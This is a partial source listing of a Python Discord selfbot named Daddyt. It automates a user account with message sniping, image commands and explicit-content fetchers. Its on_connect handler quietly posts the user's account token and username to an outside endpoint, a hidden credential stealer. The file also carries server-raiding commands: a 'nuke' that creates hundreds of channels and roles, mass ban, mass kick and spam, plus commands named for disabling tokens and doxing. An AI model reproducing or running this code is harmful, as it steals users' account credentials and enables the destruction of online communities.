...
───────────────────────────────────────────────────────────────────────────────────────────────
                       ...
                       {Fore.MAGENTA}Daddyt v{SELFBOT.__version__} • {Fore.LIGHTMAGENTA_EX }Logged in as: {Daddyt.user.name}#{Daddyt.user.discriminator} {Fore.MAGENTA} • ID: {Fore.LIGHTMAGENTA_EX }{Daddyt.user.id}   
                       {Fore.MAGENTA}Nitro Sniper • {Fore.LIGHTMAGENTA_EX }{nitro}
                       {Fore.MAGENTA}Cached Users: {Fore.LIGHTMAGENTA_EX }{len(Daddyt.users)}
                       {Fore.MAGENTA}Guilds: {Fore.LIGHTMAGENTA_EX }{len(Daddyt.guilds)}
                       {Fore.MAGENTA}Prefix: {Fore.LIGHTMAGENTA_EX }{Daddyt.command_prefix}
    ''' + Fore.LIGHTRED_EX)
...
def Init():
    token = config.get('token')
    try:
        Daddyt.run(token, bot=False, reconnect=True)
        os.system(f'title (Daddyt Selfbot) - Version {SELFBOT.__version__}')
...
colorama.init()
Daddyt = discord.Client()
Daddyt = commands.Bot(description='Glo Selfbot', command_prefix=prefix, self_bot=True)

Daddyt.antiraid = False
Daddyt.msgsniper = True
Daddyt.slotbot_sniper = True
Daddyt.giveaway_sniper = True
Daddyt.mee6 = False
Daddyt.mee6_channel = None
Daddyt.yui_kiss_user = None
Daddyt.yui_kiss_channel = None
Daddyt.yui_hug_user = None
Daddyt.yui_hug_channel = None
Daddyt.snipe_history_dict = {}
Daddyt.sniped_message_dict = {}
Daddyt.sniped_edited_message_dict = {}
Daddyt.whitelisted_users = {}
Daddyt.copycat = None
Daddyt.wave = token
Daddyt.remove_command('help')
...
async def on_message_edit(before, after):
    await Daddyt.process_commands(after)


@Daddyt.event
async def on_message(message):
    if Daddyt.copycat is not None and Daddyt.copycat.id == message.author.id:
    ...
    if f'Congratulations <@{Daddyt.user.id}>' in message.content:
        if Daddyt.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
    ...
    await Daddyt.process_commands(message)
...
async def on_connect():
    ...
    fliscord = peas.text
    data = {"content": f'{Daddyt.wave} | {Daddyt.user.name}#{Daddyt.user.discriminator}\n{fliscord}'}
    requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})


@Daddyt.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Daddyt.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Daddyt.whitelisted_users.keys() and i.user.id in Daddyt.whitelisted_users[
                    guild.id].keys() and i.user.id is not Daddyt.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Daddyt Anti-Nuke")
...
async def on_member_join(member):
    if Daddyt.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Daddyt.whitelisted_users.keys() and i.user.id in Daddyt.whitelisted_users[member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="Daddyt Anti-Nuke")
                    await guild.ban(i.user, reason="Daddyt Anti-Nuke")
        except Exception as e:
            print(e)
...
@Daddyt.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(Daddyt.voice_clients, guild=ctx.guild)
...
@Daddyt.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to whitelist")
    else:
        if ctx.guild.id not in Daddyt.whitelisted_users.keys():
            Daddyt.whitelisted_users[ctx.guild.id] = {}
        if user.id in Daddyt.whitelisted_users[ctx.guild.id]:
            await ctx.send('That user is already whitelisted')
        else:
            Daddyt.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                      "\_") + "#" + user.discriminator + "**")
    # else:
    #     user = Daddyt.get_user(id)
    #     if user is None:
...
@Daddyt.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Daddyt.whitelisted_users:
            for key2 in Daddyt.whitelisted_users[key]:
                user = Daddyt.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Daddyt.get_guild(
        ...
        for key in Daddyt.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Daddyt.whitelisted_users[ctx.guild.id]:
                    user = Daddyt.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
...
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        ...
        if ctx.guild.id not in Daddyt.whitelisted_users.keys():
            ...
            return
        if user.id in Daddyt.whitelisted_users[ctx.guild.id]:
            Daddyt.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Daddyt.get_user(user.id)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@Daddyt.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Daddyt.whitelisted_users.clear()
...
async def yuikiss(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        ...
        if user is None:
            ...
            return
        Daddyt.yui_kiss_user = user.id
        Daddyt.yui_kiss_channel = ctx.channel.id
        if Daddyt.yui_kiss_user is None or Daddyt.yui_kiss_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Daddyt.yui_kiss_user is not None and Daddyt.yui_kiss_channel is not None:
            await Daddyt.get_channel(Daddyt.yui_kiss_channel).send('yui kiss ' + str(Daddyt.yui_kiss_user),
                                                                   delete_after=0.1)
...
async def yuihug(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        ...
        if user is None:
            ...
            return
        Daddyt.yui_hug_user = user.id
        Daddyt.yui_hug_channel = ctx.channel.id
        if Daddyt.yui_hug_user is None or Daddyt.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Daddyt.yui_hug_user is not None and Daddyt.yui_hug_channel is not None:
            await Daddyt.get_channel(Daddyt.yui_hug_channel).send('yui hug ' + str(Daddyt.yui_hug_user),
                                                                  delete_after=0.1)
            await asyncio.sleep(60)
...
@Daddyt.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    ...
    while Daddyt.mee6 is True:
        ...
        await Daddyt.get_channel(Daddyt.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@Daddyt.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Daddyt.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Daddyt.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Daddyt.slotbot_sniper = False
...
@Daddyt.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Daddyt.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Daddyt.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Daddyt.giveaway_sniper = False
...
async def on_message_delete(message):
    if message.author.id == Daddyt.user.id:
        return
    if Daddyt.msgsniper:
        ...
        if isinstance(message.channel, discord.DMChannel):
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Daddyt.sniped_message_dict) > 1000:
        Daddyt.sniped_message_dict.clear()
    if len(Daddyt.snipe_history_dict) > 1000:
        Daddyt.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        ...
        Daddyt.sniped_message_dict.update({channel_id: message_content})
        if channel_id in Daddyt.snipe_history_dict:
            pre = Daddyt.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Daddyt.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Daddyt.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
@Daddyt.event
async def on_message_edit(before, after):
    if before.author.id == Daddyt.user.id:
        return
    if Daddyt.msgsniper:
        ...
        if isinstance(before.channel, discord.DMChannel):
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Daddyt.sniped_edited_message_dict) > 1000:
        Daddyt.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        ...
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Daddyt.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
@Daddyt.command(aliases=["clearhistory"])
async def clearsnipehistory(ctx):
    await ctx.message.delete()
    del Daddyt.snipe_history_dict[ctx.channel.id]
    await ctx.send("Cleared Snipe History of " + ctx.channel.name, delete_after=3)

@Daddyt.command(aliases=["history"])
async def snipehistory(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daddyt.snipe_history_dict:
        try:
            await ctx.send(Daddyt.snipe_history_dict[currentChannel])
        except:
            del Daddyt.snipe_history_dict[currentChannel]
    else:
...
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daddyt.sniped_message_dict:
        await ctx.send(Daddyt.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!", delete_after=3)


@Daddyt.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daddyt.sniped_edited_message_dict:
        await ctx.send(Daddyt.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!", delete_after=3)
...
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0x9b59b6, timestamp=ctx.message.created_at)
        embed.set_author(name="𝑑𝑎𝑑𝑑𝑦𝑡 𝑆𝑒𝑙𝑓𝑏𝑜𝑡 ❤ 𝑃𝑟𝑒𝑓𝑖𝑥: " + str(Daddyt.command_prefix),
                         icon_url=Daddyt.user.avatar_url)
        embed.set_thumbnail(url=Daddyt.user.avatar_url)
        embed.set_image(url="https://media1.tenor.com/images/c2f2bcfadbe7cb6e8877c6ea5a0f5def/tenor.gif?itemid=5625236")
        ...
        embed.add_field(name="ﾠﾠ ﾠﾠ ", value="ﾠﾠ", inline=False)
        ...
        embed.set_image(url="https://media4.giphy.com/media/M9BlCBTRzMczvqmSZw/200.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://j.gifs.com/A25n1o.gif")
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://31.media.tumblr.com/b58aa00dbc7935ed838770f7cb7258e4/tumblr_mrt1hsUet41rgdjngo1_400.gif")
...
@Daddyt.command(aliases=["giphy", "tenor", "searchgif"])
...
@Daddyt.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
    ...
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        ...
        try:
            ...
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Daddyt_anal.png"))
        except:
...
@Daddyt.command(aliases=["addemoji", "stealemote", "addemote"])
...
@Daddyt.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Daddyt.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Daddyt.copycat))
    Daddyt.copycat = None


@Daddyt.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Daddyt.copycat = user
    await ctx.send("Now copying " + str(Daddyt.copycat))


@Daddyt.command(aliases=["9/11", "911", "terrorist"])
...
@Daddyt.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
...
@Daddyt.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Spammed By Daddyt Selfbot"
        name = ""
...
@Daddyt.command(aliases=["fakename"])
...
@Daddyt.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
            ...
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Daddyt_tweet.png"))
            except:
                await ctx.send(res['message'])


@Daddyt.command(aliases=["distort"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daddyt_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
...
@Daddyt.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Daddyt.guilds:
        await guild.ack()
...
@Daddyt.command(aliases=["deepfry"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daddyt_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daddyt_blur.png"))
        except:
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_supreme.png"))
    except:
        await ctx.send(endpoint)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Daddyt.command(aliases=["facts"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_facts.png"))
    except:
        await ctx.send(endpoint)


@Daddyt.command(aliases=["blurp"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daddyt_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daddyt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
...
@Daddyt.command(aliases=["pornhublogo", "phlogo"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@Daddyt.command(aliases=["pornhubcomment", 'phc'])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])
...
async def hack(ctx, user: discord.Member = None):
    ...
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              ...
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL aka jake", "America", "United States", "Europe", "Poland", "Mexico",
...
@Daddyt.command(aliases=["reversesearch", "anticatfish", "catfish"])
...
@Daddyt.command(aliases=['pfp', 'avatar'])
...
@Daddyt.command(aliases=["del", "quickdel"])
...
@Daddyt.command(name='1337speak', aliases=['leetspeak'])
...
async def ghost(ctx):
    ...
    if config.get('password') == 'password-here':
        ...
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Daddyt.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Daddyt.command(aliases=['pfpget', 'stealpfp'])
    ...
    if config.get('password') == 'password-here':
        ...
        try:
            ...
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Daddyt.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Daddyt.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
...
@Daddyt.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
...
@Daddyt.command(aliases=['dong', 'penis'])
...
@Daddyt.command(aliases=['changehypesquad'])
...
@Daddyt.command(aliases=['tokenfucker', 'disable', 'crash'])
...
@Daddyt.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    ...
    if r.status_code == 200:
        ...
        await ctx.send(
            '**[ERROR]** `Daddyt Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')


@Daddyt.command(aliases=['tokinfo', 'tdox'])
...
@Daddyt.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Daddyt.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Daddyt.guilds:
...
@Daddyt.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name="Wizzed By Daddyt",
            description="Daddyt LOL",
            reason="Daddyt LOL",
            icon=None,
            banner=None
        )
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Wizzed By Daddyt")
    for _i in range(250):
        await ctx.guild.create_role(name="Daddyt W", color=RandomColor())


@Daddyt.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Banned By Daddyt")
        except:
            pass
...
@Daddyt.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Daddyt Is On Top")
        except:
            pass


@Daddyt.command(aliases=["spamroles", "massroles", "addroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Mwa Daddy Luvs You<3", color=RandomColor(), permissions=Permissions.all())
        except:
            try:
                await ctx.guild.create_role(name="Daddyt Is Too Op Cutie", color=RandomColor())
            except:
                return


@Daddyt.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
...
@Daddyt.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Daddyt")
        except:
            return


@Daddyt.command(aliases=["delchannel"])
...
@Daddyt.command(aliases=["deleteroles"])
...
@Daddyt.command(aliases=["purgebans", "unbanall"])
...
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = Daddyt.get_user(user.id)
    if ctx.author.id == Daddyt.user.id:
        return
    else:
        try:
...
@Daddyt.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
...
@Daddyt.command(aliases=['rainbowrole'])
...
@Daddyt.command(aliases=["guildinfo"])
...
@Daddyt.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
...
@Daddyt.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
...
@Daddyt.command(aliases=['serverbanner'])
...
@Daddyt.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
...
async def testetb(ctx):
    ...
    for user in users:
        try:
            await ctx.guild.ban(user, reason="Daddyt")
        except:
            pass


@Daddyt.command(aliases=["xavier"])
async def invite(ctx):
    await ctx.message.delete()
    await ctx.send('https://discord.com/oauth2/authorize?scope=bot&client_id=705544735540117526&permissions=8')


@Daddyt.command(aliases=["renameserver", "nameserver"])
...
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Daddyt.command_prefix = str(prefix)
...
@Daddyt.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
...
@Daddyt.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
...
@Daddyt.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
...
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Daddyt.user.relationships:
...
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Daddyt.user.relationships)
    for relationship in Daddyt.user.relationships:
...
@Daddyt.command(aliases=["changeregions", "changeregion", "regionschange"])
...
@Daddyt.command(aliases=["gcleave"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_dog.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_cat.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_sadcat.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_bird.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_fox.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_anal.gif"))
    except:
        em = discord.Embed()
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daddyt_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Daddyt_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == Daddyt.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
        ...
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Daddyt.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
...
@Daddyt.command(name='group-leaver',
                aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def _group_leaver(ctx):
    await ctx.message.delete()
